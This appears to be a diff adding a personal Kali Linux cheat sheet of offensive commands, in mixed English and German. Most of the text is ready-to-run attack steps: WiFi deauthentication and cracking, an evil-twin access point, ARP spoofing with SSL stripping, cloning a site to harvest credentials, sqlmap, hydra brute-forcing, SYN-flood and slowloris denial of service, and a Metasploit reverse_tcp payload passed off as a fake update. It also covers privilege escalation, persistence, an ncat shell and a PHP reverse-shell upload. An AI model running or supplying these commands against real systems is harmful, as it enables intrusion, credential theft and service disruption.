@@ -1,0 +1,500 @@
+-man -> descripes the keywords and the work of the services
+----------------------
+| 
+
+----------------------
+//can be used to install packages (or makefile)
+
+make install 
+make
+
+Network address change in static or DHCP
+service network restart
+
+	/etc/network/interfaces
+		static or dhcp
+			address ..
+			netmask ..
+			gateway ..
+ifdown interface
+ifup interface
+	/etc/NetworkManager/NetworkManager.conf
+	connection updown...
+-----------
+Tor
+dont use root most a normal user
+--------------------
+ProxyChains //is to manuell build a anonymous system
+	socks-proxy-net
+/etc/proxychains.conf // change it to dynamic or random and uncomment it
+
+//set the proxys at the end of the config
+socks5 127.0.0.1 9050 // TOR
+socks5 ipadress port
+	proxychains browser website socks-proxy.net
+
+	//not fast
+---------
+VPN
+	OpenVPN
+	Vpn DNS
+	vpnbook.com
+		// download and execute the follow
+		sudo openvpn --config file 
+		// username and password downloadsite description
+
+DNS change also!!
+	/etc/resolve.conf
+opendns.com
+
+
+----------------
+
+Maccchanger
+	ifconfing or ip -	link-ether macadress
+macchanger -r interface
+
+	maybe a script at boot if you forget it to change its safer
+---------------------
+cronjobs
+
+crontab --help
+crontab -e
+in file 
+	@reboot command
+
+-----------------
+nmap // port scanner
+
+who is searchmachine
+major ip blocks
+nmap.org
+
+nmap site or ip -vv 
+
+					> to a file!!
+nmap -oG - 192.168.1.0-255 -p 22 -vv > /Downloads/nmapscan
+nmap -iL file -vv 	//scans the ip in the file 
+
+------------	
+awk //its a script lamguage like perl perl is mor extendable
+
+cat file | grep Up | awk -F " " '{print $2}'
+
+--------
+curl 
+//curl is a tool for transferring data from or to a server using URLs. It supports these protocols: DICT, FILE, FTP, FTPS, GOPHER, GO‐
+       PHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET, TFTP,
+       WS and WSS.
+
+
+curl ipinfo.io/ip-adress    //1000times aday
+
+-------
+exploits
+
+exploit-db.com
+nmap.org scripts
+--------
+searchsploit //for exploits of apps - local database 
+
+
+--------------------
+AIRODUMP // is used to collect information also fore network
+
+airodump-ng [networkcard] // the pwr connectionsignal if its lesser its better
+
+airodump-ng -c [channel] -w [file] --bssid [MAC]
+
+-------------------------------
+AIREPLAY // for dissconect devices
+
+// change the channel of network card working maybe
+
+networkctl [networkInterface] channel [channelnumber]
+
+aireplay-ng -O 0 -a [MAC] [network-interface] //authentication zero means infinity loop for interrupt connection - it is 10  // its to disconect all user 
+
+
+
+----------------------------
+REAVER
+
+reaver attacks protected wifis 
+
+reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
+
+
+
+---------------------------
+CRUNCH
+
+// Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.
+
+crunch 3 5 abcd123 | aircrack-ng -w crunch //pipe the list direct to aircrack
+
+
+--------------------------
+network card monitor mode (now its in the promiscuous mode to get all packets from the area)
+
+-iwconfig "networkcard" down
+
+-iwconfig "networkcard" mode monitor
+
+-iwconfig "networkcard" up
+
+//Monitor Mode oder Monitormodus bezeichnet einen bestimmten Betriebsmodus eines Wireless Adapters,
+bei dem sämtliche empfangenen Netzwerkframes an das Betriebssystem und die Anwendungen weitergeleitet werden.
+-------------------------
+AIRCRACK // to crack wifi connections passwords
+		// maybe wordlist to crack but it dont attend to work in different language countries
+
+aircrack-ng -w [wordlist] capture.cap
+
+----------------------
+AIRMON 
+//airmon-ng - POSIX sh script designed to turn wireless cards into monitor mode.
+
+
+-airmon-ng check [networkcard]
+-kill [processID] // kill all processes cause it can be make some problems
+
+------------------------------
+wash is for network-WiFi scan (too)
+
+wash -i [interface]
+
+-----------------------------------
+// find is a tool for finding datas in systems
+
+find ~/.mozilla/firefox/ -name "places.sqlite"
+
+--------------------------------------
+ssl stripping
+
+echo 1 > /proc/sys/net/ipv4/ip_forward // to set the value of 0 or 1
+
+iptables -t  nat -A PREROUTING -p tct --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -L PREROUTING // see what happened
+
+nmap [ip] -vv
+3 terminals for attack // 
+
+-----------------------------
+SSL Stripping ARP SPOOFING in networks
+
+arpspoof -i [interface] -t [gateway] -r [ip adress host] //start arp spoof
+
+ipdatbles -I INPUT 1 -p tcp --dport 8080 -j ACCEPT //can all unused ports not only 8080
+
+iptables -I INPUT // firwall 
+
+sslstrip -l [port(8080 in this case http spoofing)] //its now listening
+
+tail -f sslstrip.log // tail By default, it shows the last 10 lines of a file
+
+-------------------------
+iptables 
+
+//iptables is a user-space utility program that allows a system administrator to configure the IP packet filter rules of the Linux kernel firewall,
+
+
+------------------------------------
+squid3 and apache2 imagemagick ghostscript jp2a
+
+Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching World Wide Web (WWW), Domain Name System (DNS), and other network lookups for a group of people sharing network resources, and aiding security by filtering traffic. Although used for mainly HTTP and File Transfer Protocol (FTP), Squid includes limited support for several other protocols including Internet Gopher, Secure Sockets Layer (SSL),[7] Transport Layer Security (TLS), and Hypertext Transfer Protocol Secure (HTTPS). Squid does not support the SOCKS protocol, unlike Privoxy, with which Squid can be used in order to provide SOCKS support. 
+
+googlesearch.pl // file which execute something like add text to victims search
+-----------------
+/etc/squid3/squid.conf 
+
+acl localnet src [ipadress] //change it to your ip adress	
+http_acess allow localnet // uncomment 
+http_acess allow localhost //uncomment 
+http_port 3128 transparent // add write transparent if its not exist
+
+//change some ipfilters firewallrules
+
+iptables -t nat -A PREROUTING -i [networkinterface] -p tcp --destination-port 80 -j R REDIRECT --to-port 3128
+
+ghostrcript // optional
+
+apache
+
+mkdir /var/www/tmp
+chmod 777 /var/www/tmp
+
+service apache2 restart
+
+//arpspoof the 
+
+arpspoof -i [interface] -t [ipadress victim] -r [some gateway]
+
+// if you change the googlesearch.pl you have to restart everytime the squid3 service
+
+--------------------------------------------
+airbase // its for create a evil twin for expeacilally a wlan acess point for example
+ 
+airbase-ng -a [macadress] -essid "essid" -c [channelnumber] [interface]
+
+yum install bridge-utils 
+
+brctl addbr evil // add bridge
+
+brctl addif evil [interface] // to the using interface
+
+brctl addif evil [airbaseinterface] // add this to the from airbase created interface too
+
+ifconfig [airbase created interface] 0.0.0.0 up // add a ip adress to the airbase interface and set it up
+
+ifconfig evil up // bring bridge interface also up
+
+dhclient3 evil // start it  
+
+// you have to disconnect wirh aireplay-ng the users from the wireless access point that they connect to the evil twin
+
+// use wireshark for the information that goes through the interface like credentials and more
+
+
+----------------------------------------------------
+
+routers attack vulnerabilities
+
+// you can execute nmap scripts 
+// to find the nmap scripts that are local downloaded execute
+locate [*.nse]
+//or nmpa.org find the exploit scripts
+// be aware its also possible to execute this on extern ip adresses of all routers
+
+nmap -p80 --script [http-tplink-dir-traversal-nse] --script-args rfile=/tmp/ath0.ap_bss -d -n -Pn (-iL and a file of ips instead of 1 ip) [target ip]
+
+--------------------------------------
+
+dnschef //its to setup a fast dns server for spoofing
+
+dnschef --fakeip=[fakeip like the router] --fakedomains=randomName.com --interface=
+
+setoolkit // enter to the shellmode
+
+// for exmaple go: 1 social engeneering attacks -  2 Website attack vectors - credential haverster attack - 2 site cloner
+// follow the instructions 
+// after you clone the site you wish the site is get by your given ip address
+
+cd /var/www/ 
+
+tail -f havester... .txt // the place where are the credentials are stored
+
+---------------------
+mysql
+
+
+mysql -h localhost(or ip) -u [user] //first login without password
+SET PASSWORD FOR root@localhost=PASSWORD('test')
+mysql -h localhost(or ip) -u [user] -p 
+
+-----------------------
+docker group change for user
+
+Achtung!
+
+Wenn man die Option -G ohne die Option -a verwendet, so wird der entsprechende User den Gruppen hinzugefügt, welche als Liste übergeben werden, und aus allen anderen entfernt! Daher muss man, falls man den User einer Gruppe hinzufügen will, ohne die anderen Gruppenzugehörigkeiten anzutasten, die Optionen -a und -G immer zusammen verwenden, da man sich ansonsten z.B. auch aus der Gruppe admin entfernen könnte (die benötigt wird, um sich Root-Rechte verschaffen zu können).
+
+Siehe auch Administrator/Notfall 
+
+groupadd docker
+
+usermod -aG docker $USER
+
+newgrp <gruppenname>
+
+Der newgrp-Befehl wirkt sich nur auf die aktuelle Sitzung des Benutzers aus. Wenn der Benutzer also mehrere Terminals oder Sitzungen geöffnet hat, muss der Befehl in jeder Sitzung ausgeführt werden, um die Änderungen zu übernehmen.
+Auf diese Weise wird die Gruppenmitgliedschaft sofort aktiv, ohne dass eine Abmeldung erforderlich ist.
+
+sudo systemctl restart sssd
+
+Um die Gruppenrichtlinien (auch als "Group Policies" bezeichnet) auf einem Linux-System neu zu laden, ohne sich abzumelden, hängt es davon ab, welches System oder Tool du verwendest, um die Richtlinien zu verwalten. In einer typischen Linux-Umgebung könnte dies durch ein Tool wie sssd (System Security Services Daemon) oder über andere Mechanismen wie LDAP oder Kerberos geschehen.
+
+-----------------------------
+sqlinkection and map
+
+sqlmap -u "URL" --cookie="security=high;" PHPSESSID=[sessionId] //the cookie seems like its is a value in the databsae...
+
+sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.
+
+logfiles dir= /root/.sqlmap/output/192.168.1.102 // will be inform you by execute the command
+
+---------------------------------------
+findmyhash is used for automatically find the hash in the web of alot of sites databses
+
+
+findmyhash [hashALGORYTHM] -hg[options] [hashValue]
+
+--------------------------------------------------
+
+john the ripper //password cracker (windows)
+
+download pwdump from openwall.com for windows sytems
+
+download john the ripper from openwall.com for windows systems
+ 
+create a folder where you extract both zips
+ 
+COMMAND: 
+pwdump7.exe > test.txt //write the output into a file
+
+//goto johntheripper folager
+
+john.exe test.txt
+ 
+john.exe --show test.txt // shows the output on cmdLine
+
+----------------------------------
+
+hydra kalilinux
+
+//hydra is used to attack webforms like logins...
+hydra -l(foruser) -P(forpasslist) passlistFile [Server IP to Attack] http-post-form "/DVWA-1.0.8/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V 
+//Login failed at the said the error messages fi you alraedy tried to login its can be helpful
+// -t you can controll threats
+//you can also you hydra GUI tool
+
+--------------------------
+
+hping3
+
+DOS ATTACKS KALI
+
+//use the SYN FLAG
+hping3 -i [microseconds]u100]u100 -S -p 80 192.168.0.1  
+
+-------------------------------------------------
+DOS ATTACK WITH NMAP scripts
+nmap.org/nsedoc/categories/dos.html
+ha.ckers.org/slowloris //gibt es nicht mehr
+
+
+
+nmap --script http-slowloris --max-parallelism 400 [ipTarget] -vv //http-sloloris is a nmap local script
+
+-----------------------------------
+
+DOS over Perl Script
+
+Github slowloris
+
+How use Slowloris
+
+Requirements:
+# sudo apt-get update  
+# sudo apt-get install perl
+# sudo apt-get install libwww-mechanize-shell-perl
+# sudo apt-get install perl-mechanize
+
+
+1)Download slowloris.pl
+2)Open Terminal
+2)# cd /thePathToYourSlowloris.plFile
+3)# ./slowloris.pl
+4)# perl slowloris.pl -dns (Victim URL or IP) -options
+
+--------------------------------------------
+
+hexdumps linux mit xxd
+
+xxd 
+
+-----------------------------------------
+metasploit 
+
+service postgresql status //metsploit need a databsae to connect
+
+service metasploit status/start
+
+msfupdate //often is better
+
+msfconsole //take a while
+
+msf> help //command to see all commands and connect to database
+
+search name:meterpreter //is a listener
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=[attackerip] x > /root/Desktop/CMD.exe //the putgoing file you can upload it to the target or as a pretended update download file
+
+use exploit/multi/handler
+
+show options
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST [ipattacker] //listening adress
+
+set LPORT [port] //listening port
+
+exploit //start listening
+
+//start the exe and the shell will be activate
+
+sessions -i 5 //session handler in example connect to id 5 and after command use shell
+
+use exploit/windows/local/ask //enter a exploit with msf particular the ask exploit
+
+show options //show the options 
+
+exploit //will start a privilege ask in windows as an administrator
+
+shell // will join the shell
+
+run persistance -h //command shows options (help)
+
+
+--------------------------------------
+netcat //for reverse connection its a reverse shell
+
+//for windows linux and more with maybe other command
+
+ncat -h
+
+ncat -v -l -p 8888 -e /bin/bash
+
+---------------------------------
+web server upload
+
+this ist just a simple way
+
+change the connections in the php reverse shell of you choice
+
+go to upload and try to upload a reverse shell 
+
+lett ncat listen on port 
+
+start the reverse shell at the uploaded directory on the server over the urlba
+
+----------------------------------
+lsof is a listing tool for open files or something else
+
+
+ipv 6 deaktivieren
+
+/etc/sysctl.conf
+
+net.ipv6.conf.all.disable_ipv6 = 1
+net.ipv6.conf.default.disable_ipv6 = 1
+net.ipv6.conf.lo.disable_ipv6 = 1
+
+check on for leaks https://test-ipv6.com/
+---------------------
+//systemd-resolved is used to handle the dns with cache and something else
+// if you disable it, the system used its manuell configuration(its better)
+
+systemctl disable systemd-resolved
+
+--------------------
+disable in Browser: WebRTC-Leaks //but its necessary for video conference
+
+
+about:config
+media.peerconnection //to false
+
+
+
+
